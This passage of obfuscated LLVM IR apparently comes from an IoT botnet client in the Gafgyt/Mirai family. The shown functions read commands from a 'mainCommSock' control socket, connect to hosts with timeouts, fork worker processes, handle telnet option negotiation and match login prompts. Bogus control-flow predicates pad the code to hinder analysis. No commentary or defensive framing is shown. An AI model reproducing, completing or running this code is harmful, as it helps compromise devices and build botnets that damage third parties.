  %168 = load i32, i32* @x.39
  %169 = load i32, i32* @y.40
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %167
  %176 = load i32, i32* @x.39
  %177 = load i32, i32* @y.40
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %184

; <label>:184:                                    ; preds = %originalBBpart244, %49
  store i32 0, i32* %18, align 4
  %185 = load i8*, i8** %6, align 8
  store i8* %185, i8** %17, align 8
  br label %186

; <label>:186:                                    ; preds = %220, %184
  %187 = load i32, i32* %7, align 4
  %188 = add nsw i32 %187, -1
  store i32 %188, i32* %7, align 4
  %189 = icmp sgt i32 %187, 1
  br i1 %189, label %190, label %223

; <label>:190:                                    ; preds = %186
  %191 = load i32, i32* @mainCommSock, align 4
  %192 = call i64 @recv(i32 %191, i8* %16, i64 1, i32 0)
  %193 = icmp ne i64 %192, 1
  br i1 %193, label %194, label %212

; <label>:194:                                    ; preds = %190
  %195 = load i32, i32* @x.39
  %196 = load i32, i32* @y.40
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %194
  %203 = load i8*, i8** %17, align 8
  store i8 0, i8* %203, align 1
  store i32 -1, i32* %4, align 4
  %204 = load i32, i32* @x.39
  %205 = load i32, i32* @y.40
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %226

; <label>:212:                                    ; preds = %190
  %213 = load i8, i8* %16, align 1
  %214 = load i8*, i8** %17, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %17, align 8
  store i8 %213, i8* %214, align 1
  %216 = load i8, i8* %16, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 10
  br i1 %218, label %219, label %220

; <label>:219:                                    ; preds = %212
  br label %223

; <label>:220:                                    ; preds = %212
  %221 = load i32, i32* %18, align 4
  %222 = add nsw i32 %221, 1
  store i32 %222, i32* %18, align 4
  br label %186

; <label>:223:                                    ; preds = %219, %186
  %224 = load i8*, i8** %17, align 8
  store i8 0, i8* %224, align 1
  %225 = load i32, i32* %18, align 4
  store i32 %225, i32* %4, align 4
  br label %226

; <label>:226:                                    ; preds = %223, %originalBBpart248
  %227 = load i32, i32* @x.39
  %228 = load i32, i32* @y.40
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %226
  %235 = load i32, i32* %4, align 4
  %236 = load i32, i32* @x.39
  %237 = load i32, i32* @y.40
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  ret i32 %235

originalBBalteredBB:                              ; preds = %originalBB, %24
  %244 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %245 = getelementptr inbounds [16 x i64], [16 x i64]* %244, i64 0, i64 0
  %246 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %245) #2, !srcloc !1
  %247 = extractvalue { i64, i64* } %246, 0
  %248 = extractvalue { i64, i64* } %246, 1
  %249 = trunc i64 %247 to i32
  store i32 %249, i32* %10, align 4
  %250 = ptrtoint i64* %248 to i64
  %251 = trunc i64 %250 to i32
  store i32 %251, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %252 = load i32, i32* @mainCommSock, align 4
  %253 = call i32 (i32, i8*, ...) @sockprintf(i32 %252, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0))
  %254 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %254, align 8
  %255 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %255, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %106
  %256 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %257 = getelementptr inbounds [16 x i64], [16 x i64]* %256, i64 0, i64 0
  %258 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %257) #2, !srcloc !2
  %259 = extractvalue { i64, i64* } %258, 0
  %260 = extractvalue { i64, i64* } %258, 1
  %261 = trunc i64 %259 to i32
  store i32 %261, i32* %14, align 4
  %262 = ptrtoint i64* %260 to i64
  %263 = trunc i64 %262 to i32
  store i32 %263, i32* %15, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %131
  %264 = load i32, i32* %5, align 4
  %_ = shl i32 %264, 64
  %265 = srem i32 %264, 64
  %266 = zext i32 %265 to i64
  %_15 = shl i64 1, %266
  %_16 = shl i64 1, %266
  %267 = shl i64 1, %266
  %268 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %269 = load i32, i32* %5, align 4
  %_17 = shl i32 %269, 64
  %_18 = shl i32 %269, 64
  %_19 = shl i32 %269, 64
  %_20 = shl i32 %269, 64
  %_21 = sub i32 %269, 64
  %gen = mul i32 %_21, 64
  %_22 = sub i32 0, %269
  %gen23 = add i32 %_22, 64
  %_24 = shl i32 %269, 64
  %_25 = sub i32 %269, 64
  %gen26 = mul i32 %_25, 64
  %270 = sdiv i32 %269, 64
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [16 x i64], [16 x i64]* %268, i64 0, i64 %271
  %273 = load i64, i64* %272, align 8
  %_27 = sub i64 0, %273
  %gen28 = add i64 %_27, %267
  %_29 = shl i64 %273, %267
  %_30 = sub i64 0, %273
  %gen31 = add i64 %_30, %267
  %_32 = sub i64 0, %273
  %gen33 = add i64 %_32, %267
  %_34 = sub i64 0, %273
  %gen35 = add i64 %_34, %267
  %274 = or i64 %273, %267
  store i64 %274, i64* %272, align 8
  %275 = load i32, i32* %5, align 4
  %_36 = shl i32 %275, 1
  %_37 = shl i32 %275, 1
  %_38 = shl i32 %275, 1
  %276 = add nsw i32 %275, 1
  %277 = call i32 @select(i32 %276, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %277, i32* %12, align 4
  %278 = icmp sle i32 %277, 0
  br label %originalBB14

originalBB42alteredBB:                            ; preds = %originalBB42, %167
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %194
  %279 = load i8*, i8** %17, align 8
  store i8 0, i8* %279, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %226
  %280 = load i32, i32* %4, align 4
  br label %originalBB50
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %132

; <label>:37:                                     ; preds = %4
  %38 = load i32, i32* @x.41
  %39 = load i32, i32* @y.42
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = load i32, i32* %6, align 4
  %49 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %16, align 4
  %51 = load i32, i32* %16, align 4
  %52 = icmp slt i32 %51, 0
  %53 = load i32, i32* @x.41
  %54 = load i32, i32* @y.42
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %61, label %123

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = call i32* @__errno_location() #13
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, 115
  br i1 %64, label %65, label %105

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %69, align 8
  br label %70

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #2, !srcloc !3
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* %6, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %85 = load i32, i32* %6, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %94 = icmp sgt i32 %93, 0
  br i1 %94, label %95, label %103

; <label>:95:                                     ; preds = %79
  store i32 4, i32* %13, align 4
  %96 = load i32, i32* %6, align 4
  %97 = bitcast i32* %14 to i8*
  %98 = call i32 @getsockopt(i32 %96, i32 1, i32 4, i8* %97, i32* %13) #2
  %99 = load i32, i32* %14, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %132

; <label>:102:                                    ; preds = %95
  br label %104

; <label>:103:                                    ; preds = %79
  store i32 0, i32* %5, align 4
  br label %132

; <label>:104:                                    ; preds = %102
  br label %122

; <label>:105:                                    ; preds = %61
  %106 = load i32, i32* @x.41
  %107 = load i32, i32* @y.42
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %105
  store i32 0, i32* %5, align 4
  %114 = load i32, i32* @x.41
  %115 = load i32, i32* @y.42
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %132

; <label>:122:                                    ; preds = %104
  br label %123

; <label>:123:                                    ; preds = %122, %originalBBpart2
  %124 = load i32, i32* %6, align 4
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 3, i8* null)
  %126 = sext i32 %125 to i64
  store i64 %126, i64* %15, align 8
  %127 = load i64, i64* %15, align 8
  %128 = and i64 %127, -2049
  store i64 %128, i64* %15, align 8
  %129 = load i32, i32* %6, align 4
  %130 = load i64, i64* %15, align 8
  %131 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 4, i64 %130)
  store i32 1, i32* %5, align 4
  br label %132

; <label>:132:                                    ; preds = %123, %originalBBpart24, %103, %101, %36
  %133 = load i32, i32* %5, align 4
  ret i32 %133

originalBBalteredBB:                              ; preds = %originalBB, %37
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %135 = getelementptr inbounds [8 x i8], [8 x i8]* %134, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %135, i8 0, i64 8, i32 4, i1 false)
  %136 = load i32, i32* %6, align 4
  %137 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %138 = call i32 @connect(i32 %136, %struct.sockaddr* %137, i32 16)
  store i32 %138, i32* %16, align 4
  %139 = load i32, i32* %16, align 4
  %140 = icmp slt i32 %139, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %105
  store i32 0, i32* %5, align 4
  br label %originalBB1
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %63

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* @x.43
  %39 = load i32, i32* @y.44
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i32, i32* %2, align 4
  %47 = load i32*, i32** %3, align 8
  %48 = load i64, i64* @numpids, align 8
  %49 = sub i64 %48, 1
  %50 = getelementptr inbounds i32, i32* %47, i64 %49
  store i32 %46, i32* %50, align 4
  %51 = load i32*, i32** @pids, align 8
  %52 = bitcast i32* %51 to i8*
  call void @free(i8* %52) #2
  %53 = load i32*, i32** %3, align 8
  store i32* %53, i32** @pids, align 8
  %54 = load i32, i32* %2, align 4
  store i32 %54, i32* %1, align 4
  %55 = load i32, i32* @x.43
  %56 = load i32, i32* @y.44
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %63

; <label>:63:                                     ; preds = %originalBBpart2, %8
  %64 = load i32, i32* @x.43
  %65 = load i32, i32* @y.44
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %63
  %72 = load i32, i32* %1, align 4
  %73 = load i32, i32* @x.43
  %74 = load i32, i32* @y.44
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  ret i32 %72

originalBBalteredBB:                              ; preds = %originalBB, %37
  %81 = load i32, i32* %2, align 4
  %82 = load i32*, i32** %3, align 8
  %83 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %83
  %gen = add i64 %_, 1
  %_1 = sub i64 0, %83
  %gen2 = add i64 %_1, 1
  %_3 = sub i64 %83, 1
  %gen4 = mul i64 %_3, 1
  %_5 = shl i64 %83, 1
  %_6 = sub i64 %83, 1
  %gen7 = mul i64 %_6, 1
  %_8 = sub i64 0, %83
  %gen9 = add i64 %_8, 1
  %_10 = shl i64 %83, 1
  %84 = sub i64 %83, 1
  %85 = getelementptr inbounds i32, i32* %82, i64 %84
  store i32 %81, i32* %85, align 4
  %86 = load i32*, i32** @pids, align 8
  %87 = bitcast i32* %86 to i8*
  call void @free(i8* %87) #2
  %88 = load i32*, i32** %3, align 8
  store i32* %88, i32** @pids, align 8
  %89 = load i32, i32* %2, align 4
  store i32 %89, i32* %1, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %63
  %90 = load i32, i32* %1, align 4
  br label %originalBB11
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.45
  %5 = load i32, i32* @y.46
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.45
  %22 = load i32, i32* @y.46
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %109 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %111

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  store i8 -1, i8* %16, align 1
  %31 = load i32, i32* %13, align 4
  %32 = call i64 @send(i32 %31, i8* %16, i64 1, i32 16384)
  %33 = load i8*, i8** %14, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 252, %36
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %30
  store i8 -2, i8* %16, align 1
  br label %102

; <label>:39:                                     ; preds = %30
  %40 = load i8*, i8** %14, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %39
  %46 = load i32, i32* @x.45
  %47 = load i32, i32* @y.46
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  store i8 -4, i8* %16, align 1
  %54 = load i32, i32* @x.45
  %55 = load i32, i32* @y.46
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %101

; <label>:62:                                     ; preds = %39
  %63 = load i32, i32* @x.45
  %64 = load i32, i32* @y.46
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i8*, i8** %14, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 3, %74
  %76 = load i32, i32* @x.45
  %77 = load i32, i32* @y.46
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %92

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i8*, i8** %14, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 1
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 253
  %90 = select i1 %89, i32 251, i32 253
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %16, align 1
  br label %100

; <label>:92:                                     ; preds = %originalBBpart28
  %93 = load i8*, i8** %14, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 1
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 253
  %98 = select i1 %97, i32 252, i32 254
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %16, align 1
  br label %100

; <label>:100:                                    ; preds = %92, %84
  br label %101

; <label>:101:                                    ; preds = %100, %originalBBpart24
  br label %102

; <label>:102:                                    ; preds = %101, %38
  %103 = load i32, i32* %13, align 4
  %104 = call i64 @send(i32 %103, i8* %16, i64 1, i32 16384)
  %105 = load i32, i32* %13, align 4
  %106 = load i8*, i8** %14, align 8
  %107 = getelementptr inbounds i8, i8* %106, i64 2
  %108 = call i64 @send(i32 %105, i8* %107, i64 1, i32 16384)
  br label %110

; <label>:109:                                    ; preds = %originalBBpart2
  br label %110

; <label>:110:                                    ; preds = %109, %102
  store i32 0, i32* %12, align 4
  br label %111

; <label>:111:                                    ; preds = %110, %29
  %112 = load i32, i32* @x.45
  %113 = load i32, i32* @y.46
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = load i32, i32* %12, align 4
  %121 = load i32, i32* @x.45
  %122 = load i32, i32* @y.46
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %120

originalBBalteredBB:                              ; preds = %originalBB, %3
  %129 = alloca i32, align 4
  %130 = alloca i32, align 4
  %131 = alloca i8*, align 8
  %132 = alloca i32, align 4
  %133 = alloca i8, align 1
  store i32 %0, i32* %130, align 4
  store i8* %1, i8** %131, align 8
  store i32 %2, i32* %132, align 4
  %134 = load i8*, i8** %131, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  store i8 -4, i8* %16, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %138 = load i8*, i8** %14, align 8
  %139 = getelementptr inbounds i8, i8* %138, i64 1
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 3, %141
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %143 = load i32, i32* %12, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
